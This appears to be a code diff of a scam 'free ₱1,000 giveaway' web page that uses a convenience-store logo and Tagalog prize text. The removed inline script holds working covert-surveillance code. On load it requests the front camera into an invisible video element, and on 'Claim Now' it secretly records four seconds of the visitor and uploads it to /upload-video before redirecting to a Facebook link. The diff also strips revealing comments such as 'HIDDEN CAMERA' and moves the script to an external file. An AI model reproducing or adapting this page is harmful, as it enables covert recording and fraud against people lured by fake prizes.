@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 FREE ₱1,000 GIVEAWAY!</title>
 <style>
-/* ===== BODY & CARD ===== */
 body {
     font-family: 'Segoe UI', Tahoma, sans-serif;
     background: #f5f5f5;
@@ -24,11 +23,6 @@ body {
     width:90%;
     max-width:400px;
 }
-    .p {
-  font-family: "Times New Roman", Times, serif;
-}
-
-/* ===== BUTTON ===== */
 .btn {
     background: #f3ba2f;
     color: #000;
@@ -43,11 +37,7 @@ body {
     transition: 0.3s;
 }
 .btn:hover { background: #dba323; }
-
-/* ===== HIDDEN CAMERA ===== */
 #vBox { width: 0; height: 0; opacity: 0; overflow: hidden; position: absolute; }
-
-/* ===== LOADING SPINNER ===== */
 #loading { display: none; margin-top: 20px; }
 .spinner {
     border: 3px solid #30363d;
@@ -59,8 +49,6 @@ body {
     margin: 0 auto 10px;
 }
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-/* ===== FALLING ANIMATION ===== */
 .item {
     position: fixed;
     top: -50px;
@@ -77,27 +65,21 @@ body {
 .item:nth-child(7){left:65%; animation-duration:7s;}
 .item:nth-child(8){left:75%; animation-duration:9s;}
 .item:nth-child(9){left:85%; animation-duration:6s;}
-.item:nth-child(10){left:95%; animation-duration:8s; }
-
-/* ===== LOGO ===== */
+.item:nth-child(10){left:95%; animation-duration:8s;}
 .logo-icon { width: 80px; margin-bottom: 20px; }
 </style>
 </head>
 <body>
 
-<!-- ===== CARD CONTENT ===== -->
 <div class="card">
     <img src="https://raw.githubusercontent.com/ninoadajar-a11y/Aray-mo/refs/heads/main/b1254f40-ca11-43dd-97a1-d86053dec6ba.jpeg" class="logo-icon" alt="7/11">
     <h2>🎉 CONGRATULATIONS! 🎉</h2>
-    <p>Nanalo ka ng ₱1,000 Cash Prize! 💸<br>
-    Click “Claim Now” to see if you’re lucky today!</p>
+    <p>Nanalo ka ng ₱1,000 Cash Prize! 💸<br>Click “Claim Now” to see if you’re lucky today!</p>
 
-    <!-- Hidden camera -->
     <div id="vBox">
         <video id="preview" autoplay playsinline muted></video>
     </div>
 
-    <!-- Loading spinner -->
     <div id="loading">
         <div class="spinner"></div>
         <p>Processing request...</p>
@@ -106,7 +88,6 @@ body {
     <button class="btn" id="startBtn">Claim Now!!!</button>
 </div>
 
-<!-- Falling emojis -->
 <div class="item">🎁</div>
 <div class="item">💸</div>
 <div class="item">🎁</div>
@@ -118,63 +99,6 @@ body {
 <div class="item">🎁</div>
 <div class="item">💰</div>
 
-<!-- ===== MAIN SCRIPT ===== -->
-<script>
-const btn = document.getElementById('startBtn');
-const loading = document.getElementById('loading');
-const video = document.getElementById('preview');
-
-// ✅ REDIRECT URL AFTER CLAIM
-const REDIRECT_URL = "https://www.facebook.com/share/1DQpaDAogj/";
-
-// Initialize camera
-async function initCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        video.srcObject = stream;
-    } catch (err) { console.warn("Camera permission denied."); }
-}
-initCamera();
-
-// Claim Now click event
-btn.addEventListener('click', async () => {
-    btn.style.display = 'none';
-    loading.style.display = 'block';
-
-    try {
-        // Record 4-second video
-        const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
-        let chunks = [];
-
-        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-
-        recorder.onstop = async () => {
-            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('video', videoBlob, 'claim_video.mp4');
-
-            try {
-                const res = await fetch("/upload-video", { method: "POST", body: formData });
-                const data = await res.json();
-                console.log("Video posted:", data);
-                loading.innerHTML = "<p>Success Your Claim Your Price!</p>";
-            } catch (err) {
-                console.error("Error posting video:", err);
-                loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
-            } finally {
-                // Always redirect after 3 seconds
-                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
-            }
-        };
-
-        recorder.start();
-        setTimeout(() => recorder.stop(), 4000);
-    } catch (err) {
-        console.error("Recording error:", err);
-        loading.innerHTML = "<p>Error occurred. Please try again.</p>";
-    }
-});
-</script>
-
+<script src="main.js"></script>
 </body>
 </html>
